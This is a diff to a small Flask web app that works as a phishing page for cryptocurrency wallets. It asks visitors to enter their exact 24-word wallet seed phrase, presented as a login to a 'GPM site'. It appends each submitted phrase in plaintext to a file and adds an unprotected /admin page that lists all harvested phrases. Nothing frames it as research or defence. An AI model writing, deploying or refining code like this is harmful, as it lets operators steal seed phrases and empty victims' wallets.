@@ -1,37 +1,48 @@
-from flask import Flask, render_template, request
-from datetime import datetime
+from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
-# Home page
 @app.route('/')
 def home():
     return render_template('index.html')
 
-# Passphrase entry page
-@app.route('/passphrase')
+@app.route('/passphrase', methods=['GET'])
 def passphrase():
     return render_template('passphrase.html')
 
-# Handle submitted passphrase
 @app.route('/submit-passphrase', methods=['POST'])
 def submit_passphrase():
-    passphrase = request.form.get('passphrase')
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open('passphrases.txt', 'a') as f:
-        f.write(f'[{timestamp}] {passphrase}\n')
-    return render_template('confirmation.html')
+    phrase = request.form.get('passphrase', '').strip()
+    words = phrase.split()
+    
+    if len(words) != 24:
+        error = "Invalid passphrase, please enter the exactly 24 words of your wallet to login to GPM site"
+        return render_template('passphrase.html', error=error, passphrase=phrase)
 
-# Admin route to view stored passphrases
-@app.route('/admin-view-passphrases')
-def view_passphrases():
+    with open("passphrases.txt", "a") as f:
+        f.write(phrase + "\n")
+
+    return redirect(url_for('home'))
+
+@app.route('/admin')
+def admin():
     try:
         with open('passphrases.txt', 'r') as f:
-            content = f.read()
-        return f"<h2>Saved Passphrases:</h2><pre>{content}</pre>"
+            phrases = f.readlines()
     except FileNotFoundError:
-        return "<h2>No passphrases found.</h2>"
+        phrases = []
+    formatted_phrases = "<br>".join([p.strip() for p in phrases])
+    return f"""
+    <html>
+    <head><title>Admin - Passphrases</title></head>
+    <body style="background-color: #f0f0f0; padding: 20px;">
+        <h2 style="text-align: center;">Submitted Passphrases</h2>
+        <div style="white-space: pre-wrap; font-family: monospace; margin-top: 20px;">
+            {formatted_phrases if phrases else 'No passphrases saved yet.'}
+        </div>
+    </body>
+    </html>
+    """
 
-# Run the app on port 5007
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5049)
+    app.run(host='0.0.0.0', port=5080)
